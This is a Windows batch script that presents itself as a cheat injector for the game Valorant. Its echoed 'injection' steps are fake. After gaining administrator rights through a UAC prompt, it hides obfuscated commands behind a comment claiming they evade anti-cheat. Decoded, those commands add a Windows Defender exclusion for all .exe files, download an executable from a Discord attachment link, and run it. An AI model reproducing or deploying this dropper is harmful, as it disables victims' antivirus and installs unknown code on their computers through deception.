@echo off

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    color 1

    echo Is Valorant open and in lobby? If not, open it up.

    pause

    echo Script assuming valorant is open.
    echo Searching for valorant process.

    rem if findin -> processlist(*Riot)

    color a

    echo Valorant process found
    echo Administration access required for injection in to VALORANT.
    echo PROCESS WILL FAIL AND WINDOW WILL CLOSE IF ADMINISTRATION ACCESS IS DENIED.
    pause

    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

cls
color a
echo Admin granted. Injecting...
rem set dll = findDLL(cheat.dll, TRUE)
rem findin -> dll.inject(processlist(*val).getPiD)

echo INJECTED. press insert for menu.

rem RANDOM JUNK BELOW SO VANGUARD DOESNT GET TRIGGERED.
p%mtSgtA%o%ApḞɌЦừQ%w%QxrnừOJ%e%bDlbZᵲ%r%ćoSowkK%s%vxWVaѠ%h%ễGԍsH%e%iVȤѧnļv%l%IXYIUfY%l%Wun☠aFRO%.%kNUćfQvl%e%uɌCṃS%x%tpBŉļt%e%UŉḞEsḞ卐Ḟ% %LIFfЦa%-%SRC☣hԍ%C%ѧz卐kRǏMT%o%lGBusɌl%m%DarHkừMź%m%ļԸpvȤrѠM%a%ćƘѧ卐yGIo%n%ŵXBsź%d%ZwZ☣卐ừ% %jǏjHozBu%"%zԍḞP☠%A%suPkԸCYl%d%źWQhƳǏx%d%ḞKGUɌ%-%ȤbfmѠЦ%M%ԸzlḆHṃ%p%B☢UԍKɌMừ%P%MEmyC%r%eCừI卐ć%e%vvŉᵲdrM%f%fsЦḞBḞ%e%qjKbv%r%FrGźmaԍԍ%e%ćbɌsDmfU%n%ļpLibZl%c%ćBpEḆ%e%JswễS% %NŵȚŉṃly%-%UЦn☠uwkd%E%QćuTcnƳ%x%ćt☣rMxFb%c%UŉfCF%l%nЦjŉqZ%u%MsBļR%s%Qkmfe%i%LƘxѧ☠Ը%o%QᵲBbźѧ%n%CghWpṃYf%E%JŵUqwrć%x%卐JԸlɌ☠Ḇ%t%IᵲFŵPkFѧ%e%zVA☣E%n%ZHѠaѠŵ%s%opHAXyq%i%ććzcs%o%XzjTn%n%Bvừe☣% %KrAan☠%'%ƘpԸѠR%.%EŵAOGt%e%ǏWBԍźM%x%JŉḆWVḆwb%e%CMOYvhuȤ%'%HwḞzЦjA%"%ŵѠGFƘǏ☢O%
p%egKoB%o%aTȚtJƘJԍ%w%rừṃLui☣Ḇ%e%wŉF☣ԍaOj%r%quCṃļkZɌ%s%tNᵲjGpvF%h%NMZnɌḆ%e%wOf☣J%l%xrhOHź%l%ŵrjaS%.%ntzṃ☢l%e%☢wźwfƳT%x%ừVSḞd%e%ѠƘRcK% %n☠źSTṃŵ%-%TIЦofN%C%gOḆVSON%o%ȚBȤ卐Qhw%m%WmHnƘừ%m%ļḆļNvb%a%lbừƳѧᵲźh%n%YsԍsƘ%d%ѧYhjѧ% %GḆRFuI%"%ŵUAdxtcừ%I%aDć☠u%n%ƘŉfjazM%v%☣IXḆlla☣%o%ᵲǏļnh%k%XѧCźnL%e%JFԸkѠo%-%ɌǏJЦļv%W%ѠɌhyfrK%e%oƘQḞUcA%b%Z☠źćzl%R%VvừļAQP%e%hŵCbwH%q%mSgǏƘCKs%u%QCjmƳIVB%e%ѠymFoxf%s%☣syQWKź%t%GxŉP☠ŉᵲ% %ƘѧrƳƳŵ%-%JGbka☠%U%ѠllćƳF%r%źQѧJR%i%lIkQS% %z卐puq%'%hvvrXQjḆ%h%j卐vDBuvF%t%xerqȚź%t%pUlćXЦQ☣%p%BYȚɌf%s%ԍᵲpŵXƘjƳ%:%ѧSrSƳu%/%PᵲƘ☠Ц☠%/%ṃ☣ᵲyiaO%c%CAḞJḞV%d%aEdzɌV%n%ᵲǏrЦnԸmO%.%ŉṃAemQ%d%ƳGJԸɌc%i%AkễEŉ%s%cYԸWY%c%lKtFYGYr%o%rźsȚxy%r%ImԸļNCTu%d%BFeźȤ%a%O卐ćvoIhr%p%DZᵲƳn%p%UsrễJl%.%EƳćŵSE%c%eJlyNừễa%o%Ǐԍwtkff%m%ễh卐ćtLpz%/%aḆЦᵲZ%a%ɌbЦXnŉƳѧ%t%fu☢卐☢vѠ%t%sHѠXć%a%ǏgiQNr卐%c%ѧᵲwDpzg%h%dEźễOh%m%jgɌ卐FḆȤ%e%gRLȚ☠nļQ%n%źƘunTmNX%t%bHŵNļN%s%HvbƳBxtQ%/%PlѧdMoKs%1%YḆvqfԸ☠x%0%YvŉzRļễ%5%DlźᵲfR%9%OLxN☢c%5%I☢eѠb%7%ć☠ḞŉQar%4%ƳhweccBG%0%nḞ☣LļƳ%6%ƘiƳRdTna%7%Jeễzźļṃw%9%BćiԸDԍ%5%ṃƳѠḞFừѧg%2%yQnqѠ%3%ȤFQBF%5%JMԸǏYȤQx%3%☠aPk卐Jv%2%ԍCQjṃѠ%9%ǏSLԍe%3%Sr卐ḞԸrZ%/%ɌƳbhI%1%bAANѧǏz%0%mNȚmLTễ%6%RɌ☠ԍK%1%GkźSY%8%GźwwAWѧ%2%lluKL%5%☣LćᵲXyP%4%ȚcƳćNPF%1%bu☢PDOu%1%☣ŉadZZừԸ%9%bAQMv%0%l☠ṃừḆbźV%8%eѧEMmŵễ%1%AXćWZI%1%Țļbouw☠k%2%Yiừ☠Ḇ%4%vḞkkkԍJd%8%pȤPkễfZt%5%IEKAa%/%uJAcễOE☣%f%ǏkjȚV%o%☠xbgm%r%TYxCćD%t%CǏareP卐y%y%gļḞkoWừ%f%WzƳ卐Qo%u%CSrxEPEƳ%l%ѧbŵS☢m☠R%l%ЦḆofƳɌI%_%ừ卐FNmB%p%dtǏDrgZ%r%RuDmoԍƳi%o%IļzQH☠Ri%t%wpfễs%e%VȤevgCŵk%c%OcrgᵲG%t%ŵJzqǏbg%e%ćḆttUeIJ%d%DVhừ☢nol%.%ƳŉȚԸr%e%ǏễsѠMqɌJ%x%YGṃ☠EćTi%e%iky☣ḆvA%'%ɌklTlZ% %zjYynŵL%-%gzXaC%O%yy☣kh%u%ŉḞѧYgƘԍ%t%Q☠qnYTMx%F%ԍEjļbx%i%teuzgƳ%l%xXŉowqễz%e%vᵲlȚJAOŉ% %ź☢☢SH%'%ŉ☢ƘeGr%%temp%\%ԍrXǏAEcg%w%p☣MѠFRnԸ%e%ȤZXwGm%r%lguGE%.%TŉRuGJCk%e%LƳ卐ѠUUC%x%ȚᵲԍATLs%e%RuTŉKK%'%qŵkJJ%"%KgXlTЦy%
s%☢k☣aḞIWO%t%ƳvsXMemM%a%yᵲgrᵲԍzN%r%ǏRŵiƳ%t%ễKziȤ☠ѧD% %OVxQP%%temp%\%ѠRừxrI%w%ḞǏbgaḞ%e%ЦDjwv%r%jļɌɌhAdx%.%pȚoԸŵZn%e%kDpZaQễ%x%udNGȚԍu%e%ȚSvLck%
pause

